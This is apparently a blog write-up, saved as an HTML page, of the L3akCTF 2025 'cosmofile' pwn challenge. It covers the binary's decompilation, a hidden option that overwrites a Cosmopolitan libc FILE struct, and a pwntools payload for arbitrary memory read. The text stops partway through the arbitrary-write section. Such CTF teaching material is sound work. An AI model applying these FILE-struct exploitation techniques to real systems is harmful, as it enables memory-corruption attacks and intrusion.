@@ -1,0 +1,330 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Liste - https://nothoudaifa.github.io/">
+    <title>writeup for pwn/cosmofile chall from l3akctf 2025 | nothoudaifa</title>
+    <meta name="description" content="I talk about computer stuff.">
+    <meta property="og:title" content="writeup for pwn/cosmofile chall from l3akctf 2025" />
+<meta property="og:description" content="TL;DR this challenge is about exploiting https://github.com/jart/cosmopolitan FILE struct implementation.
+Initial Analysis we are given cosmofile Dockerfile , using checksec on the binary we get:
+[*] &#39;/home/player/ctfs/l3ak/cosmofile/c/cosmofile&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes we can see that bsides NX, no security measure is enabled (which is good since we are exploiting it)
+opening the binary in ida we get the following decompilation of the main function:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nothoudaifa.github.io/posts/l3akctf2025-cosmofile/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-07-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-07-14T00:00:00+00:00" />
+
+
+    <meta itemprop="name" content="writeup for pwn/cosmofile chall from l3akctf 2025">
+<meta itemprop="description" content="TL;DR this challenge is about exploiting https://github.com/jart/cosmopolitan FILE struct implementation.
+Initial Analysis we are given cosmofile Dockerfile , using checksec on the binary we get:
+[*] &#39;/home/player/ctfs/l3ak/cosmofile/c/cosmofile&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes we can see that bsides NX, no security measure is enabled (which is good since we are exploiting it)
+opening the binary in ida we get the following decompilation of the main function:"><meta itemprop="datePublished" content="2025-07-14T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2025-07-14T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1217">
+<meta itemprop="keywords" content="ctf,pwn," />
+    
+    <link rel="canonical" href="https://nothoudaifa.github.io/posts/l3akctf2025-cosmofile/">
+    <link rel="icon" href="https://nothoudaifa.github.io//assets/favicon.ico">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link href="https://www.google-analytics.com" rel="preconnect" crossorigin>
+    <link rel="alternate" type="application/atom+xml" title="nothoudaifa" href="https://nothoudaifa.github.io//atom.xml" />
+    <link rel="alternate" type="application/json" title="nothoudaifa" href="https://nothoudaifa.github.io//feed.json" />
+    <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bricolage+Grotesque">
+    
+    
+    <style>*,:after,:before{box-sizing:border-box;padding:0}body{font:1rem/1.5 bricolage grotesque,-apple-system,BlinkMacSystemFont,segoe ui,Helvetica,Arial,sans-serif;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;padding:2rem;background:#fffdfa;color:#000}.skip-link{position:absolute;top:-40px;left:0;background:#eee;z-index:100}.skip-link:focus{top:0}header{line-height:2;padding-bottom:1.5rem}.link{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-decoration:none}.time{font-variant-numeric:tabular-nums;white-space:nowrap}blockquote{border-left:5px solid #eee;padding-left:1rem;margin:0}a,a:visited{color:inherit}a:hover,a.heading-link{text-decoration:none}pre{padding:.5rem;overflow:auto;overflow-x:scroll;overflow-wrap:normal}code,pre{font-family:San Francisco Mono,Monaco,consolas,lucida console,dejavu sans mono,bitstream vera sans mono,monospace;font-size:normal;font-size:small;background:#eee}code{margin:.1rem;border:none;overflow:visible;overflow-wrap:anywhere}ul{list-style-type:square}ul,ol{padding-left:1.2rem}.list{line-height:2;list-style-type:none;padding-left:0}.list li{padding-bottom:.1rem}.meta{color:#777}.content{max-width:70ch;margin:0 auto}header{line-height:2;display:flex;justify-content:space-between;padding-bottom:1rem}header a{text-decoration:none}header ul{list-style-type:none;padding:0}header li,header a{display:inline}h2.post{padding-top:.5rem}header ul a:first-child{padding-left:1rem}.nav{height:1px;background:#000;content:'';max-width:10%}.list li{display:flex;align-items:baseline}.list li time{flex:initial}.hr-list{margin-top:0;margin-bottom:0;margin-right:.5rem;margin-left:.5rem;height:1px;border:0;border-bottom:1px dotted #ccc;flex:1 0 1rem}.m,hr{border:0;margin:3rem 0}img{max-width:100%;height:auto}.post-date{margin:5% 0}.index-date{color:#9a9a9a}.animate-blink{animation:opacity 1s infinite;opacity:1}@keyframes opacity{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}.tags{display:flex;justify-content:space-between}.tags ul{padding:0;margin:0}.tags li{display:inline}.avatar{height:120px;width:120px;position:relative;margin:-10px 0 0 15px;float:right;border-radius:50%}table{width:100%;border-collapse:collapse}th,td{border:1px solid #ddd;text-align:left;padding:8px}th{background-color:#f2f2f2} </style>
+  
+    
+  
+  
+  <script type="application/ld+json">
+  {
+      "@context": "http://schema.org",
+      "@type": "BlogPosting",
+      "articleSection": "posts",
+      "name": "writeup for pwn\/cosmofile chall from l3akctf 2025",
+      "headline": "writeup for pwn\/cosmofile chall from l3akctf 2025",
+      "alternativeHeadline": "",
+      "description": "TL;DR this challenge is about exploiting https:\/\/github.com\/jart\/cosmopolitan FILE struct implementation.\nInitial Analysis we are given cosmofile Dockerfile , using checksec on the binary we get:\n[*] \u0026#39;\/home\/player\/ctfs\/l3ak\/cosmofile\/c\/cosmofile\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes we can see that bsides NX, no security measure is enabled (which is good since we are exploiting it)\nopening the binary in ida we get the following decompilation of the main function:",
+      "inLanguage": "en-us",
+      "isFamilyFriendly": "true",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https:\/\/nothoudaifa.github.io\/posts\/l3akctf2025-cosmofile\/"
+      },
+      "author" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "creator" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "accountablePerson" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "copyrightHolder" : "nothoudaifa",
+      "copyrightYear" : "2025",
+      "dateCreated": "2025-07-14T00:00:00.00Z",
+      "datePublished": "2025-07-14T00:00:00.00Z",
+      "dateModified": "2025-07-14T00:00:00.00Z",
+      "publisher":{
+          "@type":"Organization",
+          "name": "nothoudaifa",
+          "url": "https://nothoudaifa.github.io/",
+          "logo": {
+              "@type": "ImageObject",
+              "url": "https:\/\/nothoudaifa.github.io\/assets\/favicon.ico",
+              "width":"32",
+              "height":"32"
+          }
+      },
+      "image": "https://nothoudaifa.github.io/assets/favicon.ico",
+      "url" : "https:\/\/nothoudaifa.github.io\/posts\/l3akctf2025-cosmofile\/",
+      "wordCount" : "1217",
+      "genre" : [ "ctf" , "pwn" ],
+      "keywords" : [ "ctf" , "pwn" ]
+  }
+  </script>
+  
+  
+  </head>
+
+<body>
+  <a class="skip-link" href="#main">Skip to main</a>
+  <main id="main">
+  <div class="content">
+    <header>
+<p style="padding: 0;margin: 0;">
+  <a href="https://nothoudaifa.github.io/">
+    <b>nothoudaifa</b>
+    <span class="text-stone-500 animate-blink">▮</span>
+  </a>
+</p>
+<ul style="padding: 0;margin: 0;">
+  
+  
+  <li class="">
+    <a href="/posts/"><span>Posts</span></a>
+    
+  <li class="">
+    <a href="/about/"><span>About</span></a>
+    
+  </li>
+</ul>
+</header>
+<hr class="hr-list" style="padding: 0;margin: 0;">
+    <section>
+      <h2 class="post">writeup for pwn/cosmofile chall from l3akctf 2025</h2>
+      <h2 id="tldr">TL;DR</h2>
+<p>this challenge is about exploiting <a href="https://github.com/jart/cosmopolitan">https://github.com/jart/cosmopolitan</a> FILE struct implementation.</p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>we are given <code>cosmofile</code> <code>Dockerfile</code> , using checksec on the binary we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#d88200">&#39;/home/player/ctfs/l3ak/cosmofile/c/cosmofile&#39;</span>
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+    Stripped:   No
+    Debuginfo:  Yes
+</code></pre></div><p>we can see that bsides NX, no security measure is enabled (which is good since we are exploiting it)</p>
+<p>opening the binary in ida we get the following decompilation of the main function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#00a8c8">int</span> <span style="color:#00a8c8">__fastcall</span> <span style="color:#75af00">main</span><span style="color:#111">(</span><span style="color:#00a8c8">int</span> <span style="color:#111">argc</span><span style="color:#111">,</span> <span style="color:#00a8c8">const</span> <span style="color:#00a8c8">char</span> <span style="color:#f92672">**</span><span style="color:#111">argv</span><span style="color:#111">,</span> <span style="color:#00a8c8">const</span> <span style="color:#00a8c8">char</span> <span style="color:#f92672">**</span><span style="color:#111">envp</span><span style="color:#111">)</span>
+<span style="color:#111">{</span>
+  <span style="color:#111">_BYTE</span> <span style="color:#111">buf</span><span style="color:#111">[</span><span style="color:#ae81ff">4100</span><span style="color:#111">];</span> <span style="color:#75715e">// [rsp+0h] [rbp-1010h] BYREF
+</span><span style="color:#75715e"></span>  <span style="color:#00a8c8">int</span> <span style="color:#111">v5</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+1004h] [rbp-Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#111">FILE</span> <span style="color:#f92672">*</span><span style="color:#111">f</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+1008h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#111">f</span> <span style="color:#f92672">=</span> <span style="color:#111">fopen</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/tmp/cosmofile.txt&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;rw+&#34;</span><span style="color:#111">);</span>
+  <span style="color:#111">setbuf</span><span style="color:#111">(</span><span style="color:#111">stdout</span><span style="color:#111">,</span> <span style="color:#ae81ff">0LL</span><span style="color:#111">);</span>
+  <span style="color:#111">setbuf</span><span style="color:#111">(</span><span style="color:#111">stdin</span><span style="color:#111">,</span> <span style="color:#ae81ff">0LL</span><span style="color:#111">);</span>
+  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">f</span> <span style="color:#111">)</span>
+  <span style="color:#111">{</span>
+    <span style="color:#111">fwrite</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Here is a secret of the universe:</span><span style="color:#8045ff">\n</span><span style="color:#d88200">... huh?</span><span style="color:#8045ff">\n</span><span style="color:#d88200">&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">1uLL</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2BuLL</span><span style="color:#111">,</span> <span style="color:#111">f</span><span style="color:#111">);</span>
+    <span style="color:#111">fwrite</span><span style="color:#111">(</span><span style="color:#d88200">&#34;It&#39;s not here...&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">1uLL</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x10uLL</span><span style="color:#111">,</span> <span style="color:#111">f</span><span style="color:#111">);</span>
+    <span style="color:#111">fflush</span><span style="color:#111">(</span><span style="color:#111">f</span><span style="color:#111">);</span>
+    <span style="color:#111">rewind</span><span style="color:#111">(</span><span style="color:#111">f</span><span style="color:#111">);</span>
+    <span style="color:#00a8c8">while</span> <span style="color:#111">(</span> <span style="color:#ae81ff">1</span> <span style="color:#111">)</span>
+    <span style="color:#111">{</span>
+      <span style="color:#00a8c8">while</span> <span style="color:#111">(</span> <span style="color:#ae81ff">1</span> <span style="color:#111">)</span>
+      <span style="color:#111">{</span>
+        <span style="color:#00a8c8">while</span> <span style="color:#111">(</span> <span style="color:#ae81ff">1</span> <span style="color:#111">)</span>
+        <span style="color:#111">{</span>
+          <span style="color:#111">menu</span><span style="color:#111">();</span>
+          <span style="color:#111">v5</span> <span style="color:#f92672">=</span> <span style="color:#111">read_int</span><span style="color:#111">();</span>
+          <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">v5</span> <span style="color:#f92672">!=</span> <span style="color:#111">(</span><span style="color:#111">_DWORD</span><span style="color:#111">)</span><span style="color:#f92672">&amp;</span><span style="color:#111">unk_6E7472</span> <span style="color:#111">)</span>
+            <span style="color:#00a8c8">break</span><span style="color:#111">;</span>
+          <span style="color:#111">cosmo_puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Whoa whoa whoa... you can&#39;t just hide the secret of the universe like that!&#34;</span><span style="color:#111">);</span>
+          <span style="color:#111">cosmo_puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Just kidding, that&#39;s not really a secret...&#34;</span><span style="color:#111">);</span>
+          <span style="color:#111">read</span><span style="color:#111">(</span><span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#111">f</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x70uLL</span><span style="color:#111">);</span>
+        <span style="color:#111">}</span>
+        <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">v5</span> <span style="color:#f92672">&lt;=</span> <span style="color:#111">(</span><span style="color:#00a8c8">int</span><span style="color:#111">)</span><span style="color:#f92672">&amp;</span><span style="color:#111">unk_6E7472</span> <span style="color:#111">)</span>
+          <span style="color:#00a8c8">break</span><span style="color:#111">;</span>
+<span style="color:#111">LABEL_12</span><span style="color:#111">:</span>
+        <span style="color:#111">cosmo_puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Invalid choice. Please try again.&#34;</span><span style="color:#111">);</span>
+      <span style="color:#111">}</span>
+      <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">v5</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> <span style="color:#111">)</span>
+      <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">v5</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#111">)</span>
+        <span style="color:#111">{</span>
+          <span style="color:#111">cosmo_print</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Exiting...</span><span style="color:#8045ff">\n</span><span style="color:#d88200">&#34;</span><span style="color:#111">);</span>
+          <span style="color:#111">exit</span><span style="color:#111">(</span><span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+        <span style="color:#111">}</span>
+        <span style="color:#00a8c8">goto</span> <span style="color:#111">LABEL_12</span><span style="color:#111">;</span>
+      <span style="color:#111">}</span>
+      <span style="color:#111">cosmo_print</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Reading from cosmofile:</span><span style="color:#8045ff">\n</span><span style="color:#d88200">&#34;</span><span style="color:#111">);</span>
+      <span style="color:#111">fread</span><span style="color:#111">(</span><span style="color:#111">buf</span><span style="color:#111">,</span> <span style="color:#ae81ff">1uLL</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x1000uLL</span><span style="color:#111">,</span> <span style="color:#111">f</span><span style="color:#111">);</span>
+      <span style="color:#111">cosmo_puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Content of cosmofile:&#34;</span><span style="color:#111">);</span>
+      <span style="color:#111">write</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#111">buf</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x1000uLL</span><span style="color:#111">);</span>
+      <span style="color:#111">cosmo_puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;</span><span style="color:#8045ff">\n</span><span style="color:#d88200">Nice, now you can see the universe in a different light!&#34;</span><span style="color:#111">);</span>
+    <span style="color:#111">}</span>
+  <span style="color:#111">}</span>
+  <span style="color:#111">perror</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Failed to open file&#34;</span><span style="color:#111">);</span>
+  <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">1</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+</code></pre></div><p>it starts by opening a file <code>/tmp/cosmofile.txt</code> and writing some data to it, then it gives us this menu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#111">[[</span> <span style="color:#111">cosmofile</span> <span style="color:#111">]]</span>
+<span style="color:#ae81ff">1.</span> <span style="color:#111">Read</span> <span style="color:#111">a</span> <span style="color:#111">secret</span> <span style="color:#111">of</span> <span style="color:#111">the</span> <span style="color:#111">universe</span>
+<span style="color:#ae81ff">2.</span> <span style="color:#111">Exit</span>
+<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>option 1 allows us to read from the file and write the output to stdout and option 2 let’s us exit, but actually there is one more secret option, <code>if ( v5 != (_DWORD)&amp;unk_6E7472 )</code> if v5 is equal to 7238770 (0x6E7472 in decimal), we can write into the FILE struct.</p>
+<h2 id="exploring-the-file-struct-implementation">Exploring the FILE struct implementation:</h2>
+<p>this is a typical FILE struct exploitation ctf chall, where we can write into the FILE struct and we have to exploit it’s inner workings to get arbitrary execution (in this case), it’s just that this is not glibc.</p>
+<p>looking into the FILE struct definition in ida we see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">00000000</span> <span style="color:#00a8c8">struct</span> <span style="color:#111">FILE</span> <span style="color:#75715e">// sizeof=0x70
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000000</span> <span style="color:#111">{</span>                                       <span style="color:#75715e">// XREF: .data:__stdin/r
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000000</span>                                         <span style="color:#75715e">// .data:__stdout/r
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000000</span>     <span style="color:#00a8c8">char</span> <span style="color:#111">bufmode</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000001</span>     <span style="color:#00a8c8">char</span> <span style="color:#111">freethis</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000002</span>     <span style="color:#00a8c8">char</span> <span style="color:#111">freebuf</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000003</span>     <span style="color:#00a8c8">char</span> <span style="color:#111">forking</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000004</span>     <span style="color:#00a8c8">int</span> <span style="color:#111">oflags</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">8</span>     <span style="color:#00a8c8">int</span> <span style="color:#111">state</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">0000000</span><span style="color:#111">C</span>     <span style="color:#00a8c8">int</span> <span style="color:#111">fd</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000010</span>     <span style="color:#00a8c8">int</span> <span style="color:#111">pid</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000014</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000015</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000016</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000017</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span>     <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span> <span style="color:#111">size</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">0000001</span><span style="color:#111">C</span>     <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span> <span style="color:#111">beg</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000020</span>     <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span> <span style="color:#111">end</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000024</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000025</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000026</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">00000027</span>     <span style="color:#75715e">// padding byte
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0000002</span><span style="color:#ae81ff">8</span>     <span style="color:#00a8c8">char</span> <span style="color:#f92672">*</span><span style="color:#111">buf</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000030</span>     <span style="color:#111">pthread_mutex_t</span> <span style="color:#111">lock</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">0000005</span><span style="color:#ae81ff">8</span>     <span style="color:#111">Dll</span> <span style="color:#111">elem</span><span style="color:#111">;</span>                           <span style="color:#75715e">// XREF: stdin_init:loc_4019BE/o
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0000005</span><span style="color:#ae81ff">8</span>                                         <span style="color:#75715e">// stdout_init+6/o ...
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0000006</span><span style="color:#ae81ff">8</span>     <span style="color:#00a8c8">char</span> <span style="color:#f92672">*</span><span style="color:#111">getln</span><span style="color:#111">;</span>
+<span style="color:#ae81ff">00000070</span> <span style="color:#111">};</span>
+</code></pre></div><p>since there is no function pointers in it we will have to get arb read/write and write into the stack.</p>
+<p>opening the fread function, we see that it claims the lock then, calls <code>fread_unlocked</code> (which is where the logic of fread resides), it’s full decompilation is <a href="/l3akctf2025-cosmofile/fread-decomp.c">here</a>.</p>
+<h3 id="getting-arb-read">Getting arb read:</h3>
+<p>we can see at first it does some checks for overflow / file is readable … etc , then it has this piece of code which can be used to getting arb read:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#111">v9</span> <span style="color:#f92672">=</span> <span style="color:#111">count</span> <span style="color:#f92672">*</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#111">__int128</span><span style="color:#111">)</span><span style="color:#111">stride</span><span style="color:#111">;</span> <span style="color:#75715e">// in our case v9 is (0x1000 * 1) = 0x1000
+</span><span style="color:#75715e"></span><span style="color:#111">v13</span> <span style="color:#f92672">=</span> <span style="color:#111">end</span> <span style="color:#f92672">-</span> <span style="color:#111">beg</span><span style="color:#111">;</span>
+  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">v13</span> <span style="color:#f92672">&gt;=</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">__int64</span><span style="color:#111">)</span><span style="color:#111">v9</span> <span style="color:#111">)</span>
+  <span style="color:#111">{</span>
+    <span style="color:#111">nb</span> <span style="color:#f92672">=</span> <span style="color:#111">v9</span><span style="color:#111">;</span>
+    <span style="color:#111">memmove</span><span style="color:#111">(</span><span style="color:#111">buf</span><span style="color:#111">,</span> <span style="color:#f92672">&amp;</span><span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">buf</span><span style="color:#111">[</span><span style="color:#111">beg</span><span style="color:#111">],</span> <span style="color:#111">v9</span><span style="color:#111">);</span>
+    <span style="color:#111">v32</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">beg</span> <span style="color:#f92672">+</span> <span style="color:#111">nb</span><span style="color:#111">;</span>
+    <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">beg</span> <span style="color:#f92672">=</span> <span style="color:#111">v32</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">v32</span> <span style="color:#f92672">==</span> <span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">end</span> <span style="color:#111">)</span>
+      <span style="color:#f92672">*</span><span style="color:#111">(</span><span style="color:#111">_QWORD</span> <span style="color:#f92672">*</span><span style="color:#111">)</span><span style="color:#f92672">&amp;</span><span style="color:#111">f</span><span style="color:#f92672">-&gt;</span><span style="color:#111">beg</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">count</span><span style="color:#111">;</span>
+  <span style="color:#111">}</span>
+</code></pre></div><p>it checks if end - beg , which is the amount of data available in f-&gt;buf is bigger than how much fread wants, and if it is it just memmove’s the data from the f→buf to the user provided buffer (which will be written to stdout after fread finishes) then it returns, since we can control f→buf, we can get arb read using this.</p>
+<p>here is a simple pwntools poc for getting arb read, our payload sets buf to the addr we want to read from and makes sure that end - beg is bigger than 0x1000, note that the payload is just the default values of the FILE struct with <code>beg</code>, <code>end</code>, <code>size</code> and <code>addr</code> replaced in, since they are the only values we want to change.</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">def</span> <span style="color:#75af00">arb_read</span><span style="color:#111">(</span><span style="color:#111">addr</span><span style="color:#111">):</span>
+    <span style="color:#111">sz</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
+    <span style="color:#111">beg</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+    <span style="color:#111">end</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
+    <span style="color:#111">payload</span> <span style="color:#f92672">=</span> <span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000024200010100</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000000300000000</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000000000000000</span><span style="color:#111">)</span>\
+    <span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#111">sz</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#111">beg</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#111">end</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p32</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#111">addr</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x2</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">)</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>\
+    <span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x000000000042f338</span><span style="color:#111">)</span><span style="color:#f92672">+</span> <span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x000000000042f3d8</span><span style="color:#111">)</span><span style="color:#f92672">+</span><span style="color:#111">p64</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0000000000000000</span><span style="color:#111">)</span>
+
+    <span style="color:#111">write_to_FILE</span><span style="color:#111">(</span><span style="color:#111">payload</span><span style="color:#111">)</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">call_fread</span><span style="color:#111">()</span> 
+</code></pre></div><h3 id="getting-arb-write">Getting arb write:</h3>
+<p>the only way we can get arb write is if fread writes into the FILE struct buf, and that only happens in this part of the function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+  <span style="color:#111">v9</span> <span style="color:#f92672">=</span> <span style="color:#111">count</span> <span style="color:#f92672">*</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#111">__int128</span><span style="color:#111">)</span><span style="color:#111">stride</span><span style="color:#111">;</span>
+  <span style="color:#111">v11</span> <span style="color:#f92672">=</span> <span style="color:#111">v9</span><span style="color:#111">;</span>
+  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">end</span> <span style="color:#f92672">!=</span> <span style="color:#111">beg</span> <span style="color:#111">)</span>
+  <span style="color:#111">{</span>
+    <span style="color:#111">na</span> <span style="color:#f92672">=</span> <span style="color:#111">v11</span><span style="color:#111">;</span>
